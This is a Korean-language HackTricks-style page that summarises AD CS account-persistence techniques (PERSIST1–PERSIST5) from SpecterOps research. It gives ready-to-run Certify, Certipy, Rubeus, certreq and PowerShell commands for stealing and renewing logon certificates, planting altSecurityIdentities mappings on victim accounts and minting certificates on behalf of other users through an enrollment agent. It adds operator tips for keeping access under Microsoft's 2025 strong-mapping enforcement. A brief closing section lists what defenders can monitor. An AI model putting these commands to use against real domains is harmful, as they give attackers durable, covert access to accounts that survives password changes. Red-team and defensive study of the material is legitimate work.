# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**이것은 [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)에서의 훌륭한 연구의 계정 지속성 장에 대한 간단한 요약입니다.**

## 인증서를 통한 활성 사용자 자격 증명 도난 이해 – PERSIST1

사용자가 도메인 인증을 허용하는 인증서를 요청할 수 있는 시나리오에서, 공격자는 이 인증서를 요청하고 훔쳐 네트워크에서 지속성을 유지할 기회를 갖습니다. 기본적으로 Active Directory의 `User` 템플릿은 이러한 요청을 허용하지만, 때때로 비활성화될 수 있습니다.

[Certify](https://github.com/GhostPack/Certify) 또는 [Certipy](https://github.com/ly4k/Certipy)를 사용하여 클라이언트 인증을 허용하는 활성화된 템플릿을 검색한 다음 요청할 수 있습니다:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
인증서의 힘은 인증서가 유효한 한, 비밀번호 변경과 관계없이 소속된 사용자로서 인증할 수 있는 능력에 있습니다.

PEM을 PFX로 변환하고 이를 사용하여 TGT를 얻을 수 있습니다:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> 참고: 다른 기술과 결합하여 (THEFT 섹션 참조), 인증서 기반 인증은 LSASS에 손대지 않고 비승격된 컨텍스트에서도 지속적인 액세스를 허용합니다.

## 인증서를 통한 머신 지속성 확보 - PERSIST2

공격자가 호스트에서 상승된 권한을 가지고 있다면, 기본 `Machine` 템플릿을 사용하여 손상된 시스템의 머신 계정을 인증서에 등록할 수 있습니다. 머신으로 인증하면 로컬 서비스에 대해 S4U2Self를 활성화할 수 있으며, 이는 내구성 있는 호스트 지속성을 제공할 수 있습니다:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Extending Persistence Through Certificate Renewal - PERSIST3

인증서 템플릿의 유효성 및 갱신 기간을 악용하면 공격자가 장기적인 접근을 유지할 수 있습니다. 이전에 발급된 인증서와 그 개인 키를 소유하고 있다면, 만료 전에 이를 갱신하여 원래 주체와 연결된 추가 요청 아티팩트 없이 새롭고 장기적인 자격 증명을 얻을 수 있습니다.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> 운영 팁: 공격자가 보유한 PFX 파일의 수명을 추적하고 조기에 갱신하십시오. 갱신은 또한 업데이트된 인증서가 현대 SID 매핑 확장을 포함하도록 하여 더 엄격한 DC 매핑 규칙 하에서도 사용 가능하게 유지합니다(다음 섹션 참조).

## 명시적 인증서 매핑 심기 (altSecurityIdentities) – PERSIST4

대상 계정의 `altSecurityIdentities` 속성에 쓸 수 있다면, 공격자가 제어하는 인증서를 해당 계정에 명시적으로 매핑할 수 있습니다. 이는 비밀번호 변경을 넘어 지속되며, 강력한 매핑 형식을 사용할 경우 현대 DC 집행 하에서도 기능을 유지합니다.

고수준 흐름:

1. 제어하는 클라이언트 인증서를 얻거나 발급합니다(예: `User` 템플릿에 본인으로 등록).
2. 인증서에서 강력한 식별자를 추출합니다(발급자+일련번호, SKI 또는 SHA1-공개키).
3. 해당 식별자를 사용하여 피해자 주체의 `altSecurityIdentities`에 명시적 매핑을 추가합니다.
4. 인증서로 인증합니다; DC는 이를 명시적 매핑을 통해 피해자에게 매핑합니다.

예제 (PowerShell) 강력한 발급자+일련번호 매핑 사용:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
그런 다음 PFX로 인증합니다. Certipy는 TGT를 직접 얻습니다:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
```
노트
- 강력한 매핑 유형만 사용하십시오: X509IssuerSerialNumber, X509SKI 또는 X509SHA1PublicKey. 약한 형식(주체/발급자, 주체 전용, RFC822 이메일)은 더 이상 사용되지 않으며 DC 정책에 의해 차단될 수 있습니다.
- 인증서 체인은 DC에서 신뢰하는 루트로 구축되어야 합니다. NTAuth의 엔터프라이즈 CA는 일반적으로 신뢰되며, 일부 환경에서는 공용 CA도 신뢰합니다.

약한 명시적 매핑 및 공격 경로에 대한 자세한 내용은 다음을 참조하십시오:

{{#ref}}
domain-escalation.md
{{#endref}}

## 등록 에이전트를 통한 지속성 – PERSIST5

유효한 인증서 요청 에이전트/등록 에이전트 인증서를 얻으면 사용자를 대신하여 새로운 로그온 가능 인증서를 마음대로 발급할 수 있으며, 에이전트 PFX를 오프라인 상태로 유지하여 지속성 토큰으로 사용할 수 있습니다. 남용 워크플로우:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
에이전트 인증서 또는 템플릿 권한의 폐지가 이 지속성을 제거하는 데 필요합니다.

## 2025 강력한 인증서 매핑 시행: 지속성에 미치는 영향

Microsoft KB5014754는 도메인 컨트롤러에서 강력한 인증서 매핑 시행을 도입했습니다. 2025년 2월 11일부터 DC는 기본적으로 전체 시행으로 설정되어 약한/모호한 매핑을 거부합니다. 실질적인 의미:

- SID 매핑 확장이 없는 2022년 이전 인증서는 DC가 전체 시행 모드일 때 암묵적 매핑에 실패할 수 있습니다. 공격자는 AD CS를 통해 인증서를 갱신하여 SID 확장을 얻거나 `altSecurityIdentities`에 강력한 명시적 매핑을 심어 접근을 유지할 수 있습니다 (PERSIST4).
- 강력한 형식(발급자+일련번호, SKI, SHA1-공개키)을 사용하는 명시적 매핑은 계속 작동합니다. 약한 형식(발급자/주체, 주체 전용, RFC822)은 차단될 수 있으며 지속성을 위해 피해야 합니다.

관리자는 다음을 모니터링하고 경고해야 합니다:
- `altSecurityIdentities`의 변경 및 등록 에이전트와 사용자 인증서의 발급/갱신.
- 대리 요청 및 비정상적인 갱신 패턴에 대한 CA 발급 로그.

## 참조

- Microsoft. KB5014754: Windows 도메인 컨트롤러의 인증서 기반 인증 변경 사항 (시행 일정 및 강력한 매핑).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy Wiki – 명령 참조 (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference

{{#include ../../../banners/hacktricks-training.md}}
